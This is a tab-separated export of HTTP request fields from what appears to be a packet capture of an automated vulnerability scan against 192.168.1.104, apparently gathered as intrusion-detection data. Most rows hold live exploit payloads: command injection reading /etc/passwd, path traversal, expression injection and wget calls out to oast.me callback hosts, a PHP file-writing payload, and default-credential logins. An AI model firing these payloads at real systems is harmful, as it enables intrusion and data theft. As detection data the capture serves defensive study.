http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip	de,en-US;q=0.7,en;q=0.3	maint:password						Basic bWFpbnQ6cGFzc3dvcmQ=		max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/maint/modules/home/index.php?lang=english|cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/maint/modules/home/index.php?lang=english|cat%20/etc/passwd
	gzip																close		1142	1142	application/xml						192.168.1.104															1	http://192.168.1.104/web/webtools/control/SOAPService		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/webtools/control/SOAPService
	gzip																close		168	168							192.168.1.104														192.168.1.104	1	http://192.168.1.104/web/rest/tinymce/1/macro/preview		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/rest/tinymce/1/macro/preview
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/linuxki/experimental/vis/kivis.php?type=kitrace&pid=0;echo%20START;cat%20/etc/passwd;echo%20END;		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/linuxki/experimental/vis/kivis.php?type=kitrace&pid=0;echo%20START;cat%20/etc/passwd;echo%20END;
	gzip																close				application/x-www-form-urlencoded;charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/guest_auth/poc.php?cmd=cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/guest_auth/poc.php?cmd=cat%20/etc/passwd
application/json	gzip																close		307	307	application/json						192.168.1.104															1	http://192.168.1.104/web/_ignition/execute-solution		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/_ignition/execute-solution
	gzip																close		32	32							192.168.1.104															1	http://192.168.1.104/web/.%0d./.%0d./.%0d./.%0d./bin/sh		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/.%0d./.%0d./.%0d./.%0d./bin/sh
	gzip																close		172	172							192.168.1.104															1	http://192.168.1.104/web/directdata/direct/router		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/directdata/direct/router
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/pages/createpage-entervariables.action?SpaceKey=x		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/pages/createpage-entervariables.action?SpaceKey=x
	gzip		user:user						Basic dXNlcjp1c2Vy								close		123	123	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/users/sign_in		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/users/sign_in
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.jsp		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36			JSESSIONID=../../../../../usr/local/tomcat/groovy	/web/index.jsp
	gzip																close		399	399	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/checkValid		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/checkValid
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/?p=1		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/?p=1
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/index.php?plot=;wget%20http://c8ach799m8v918fkv9igcekcteyyyyyy1.oast.me		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/index.php?plot=;wget%20http://c8ach799m8v918fkv9igcekcteyyyyyy1.oast.me
*/*	gzip																close		84	84	application/json						192.168.1.104															1	http://192.168.1.104/web/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData
application/json	gzip																close		142	142	application/json						192.168.1.104															1	http://192.168.1.104/web/_ignition/execute-solution		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/_ignition/execute-solution
	gzip																close		228	228	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/
*/*	gzip	en															close		1046	1046	text/xml						192.168.1.104															1	http://192.168.1.104/web/wls-wsat/CoordinatorPortType		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/wls-wsat/CoordinatorPortType
	gzip																close		169	169	application/x-www-form-urlencoded; charset=utf-8						192.168.1.104															1	http://192.168.1.104/web/console/images/%252e%252e%252fconsole.portal		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/console/images/%252e%252e%252fconsole.portal
	gzip																close		47	47	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/pages/createpage-entervariables.action		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/pages/createpage-entervariables.action
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/poc.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/poc.txt
	gzip		admin:PASS						Basic YWRtaW46UEFTUw==								close		123	123	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/api/experimental/test		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/api/experimental/test
*/*	gzip	en															close										192.168.1.104														http://192.168.1.104/web/webadmin/admin/service_manager_data.php	1	http://192.168.1.104/web/webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f2022626d39755a5868706333526c626e513d22207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f2022626d39755a5868706333526c626e513d22207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/hystrix/;a=a/__$%7BT%20%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22nslookup%20c8ach799m8v918fkv9igcekcteeyyyyya.oast.me%22%29%7D__::.x/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/hystrix/;a=a/__$%7BT%20%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22nslookup%20c8ach799m8v918fkv9igcekcteeyyyyya.oast.me%22%29%7D__::.x/
	gzip																close		195	195	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web/diagnostic.html?t=201701020919	1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36			product=cpe; cpe_buildTime=201701020919; vendor=mobinnet; connType=lte; cpe_multiPdnEnable=1; cpe_lang=en; cpe_voip=0; cpe_cwmpc=1; cpe_snmp=1; filesharing=0; cpe_switchEnable=0; cpe_IPv6Enable=0; cpe_foc=0; cpe_vpn=1; cpe_httpsEnable=0; cpe_internetMTUEnable=0; cpe_opmode=lte; sessionTime=1631653385102; cpe_login=admin	/web/
	gzip																close				application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/include/exportUser.php?type=3&cla=application&func=_exec&opt=(cat%20/etc/passwd)%3Enuclei.txt		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/include/exportUser.php?type=3&cla=application&func=_exec&opt=(cat%20/etc/passwd)%3Enuclei.txt
*/*	gzip	en															close		101	101							192.168.1.104															1	http://192.168.1.104/web/actions/authenticate.php		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/actions/authenticate.php
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/index.php?a=fetch&content=%3C%3Fphp+file_put_contents%28%2225SnEkT2P49VWtBjX7t0PRxInp7.php%22%2C%22%3C%3Fphp+echo+phpinfo%28%29%3B%22%29%3B		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/index.php?a=fetch&content=%3C%3Fphp+file_put_contents%28%2225SnEkT2P49VWtBjX7t0PRxInp7.php%22%2C%22%3C%3Fphp+echo+phpinfo%28%29%3B%22%29%3B
	gzip																close		790	790	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web/index.htmlr	1	http://192.168.1.104/web/goform/setmac		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/goform/setmac
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/pages/systemcall.php?command=cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/pages/systemcall.php?command=cat%20/etc/passwd
*/*	gzip	en															close		22	22	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/website/blog/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/website/blog/
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/api/experimental/dags/example_trigger_target_dag/paused/false		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/api/experimental/dags/example_trigger_target_dag/paused/false
*/*	gzip																close		736	736	multipart/form-data; boundary=01b28e152ee044338224bf647275f8eb						192.168.1.104															1	http://192.168.1.104/web/lib/crud/userprocess.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36			PHPSESSID=25SnEndwruRx1e3JIBWyyiT11TU	/web/lib/crud/userprocess.php
*/*	gzip	en															close										192.168.1.104														http://192.168.1.104/web/webadmin/admin/service_manager_data.php	1	http://192.168.1.104/web/webadmin/out		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/webadmin/out
*/*	gzip	en															close		0	0							192.168.1.104															1	http://192.168.1.104/web/PDC/ajaxreq.php?PARAM=127.0.0.1+-c+0%3B+cat+%2Fetc%2Fpasswd&DIAGNOSIS=PING		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/PDC/ajaxreq.php?PARAM=127.0.0.1+-c+0%3B+cat+%2Fetc%2Fpasswd&DIAGNOSIS=PING
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;/root/kerbynet.cgi/scripts/getkey%20../../../etc/passwd;%22		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;/root/kerbynet.cgi/scripts/getkey%20../../../etc/passwd;%22
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20Payload;		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20Payload;
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/ui/vropspluginui/rest/services/getstatus		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/ui/vropspluginui/rest/services/getstatus
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/password.cgi		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/password.cgi
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/25SnEkT2P49VWtBjX7t0PRxInp7.php		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/25SnEkT2P49VWtBjX7t0PRxInp7.php
*/*	gzip	en															close		2528	2528	application/xml						192.168.1.104															1	http://192.168.1.104/web/struts2-rest-showcase/orders/3		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/struts2-rest-showcase/orders/3
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/seeyon/thirdpartyController.do.css/..;/ajax.do		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/seeyon/thirdpartyController.do.css/..;/ajax.do
*/*	gzip																close		169	169	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/_search		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/_search
*/*	gzip, deflate																close		160	160	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/javax.faces.resource/dynamiccontent.properties.xhtml		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/javax.faces.resource/dynamiccontent.properties.xhtml
	gzip																close		1047	1047	multipart/form-data; boundary=8b1ab266c41afb773af2e064bc526458						192.168.1.104															1	http://192.168.1.104/web/./RestAPI/LogonCustomization		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/./RestAPI/LogonCustomization
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip	de,en-US;q=0.7,en;q=0.3	maint:password						Basic bWFpbnQ6cGFzc3dvcmQ=		max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/maint/modules/home/index.php?lang=english|cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/maint/modules/home/index.php?lang=english|cat%20/etc/passwd
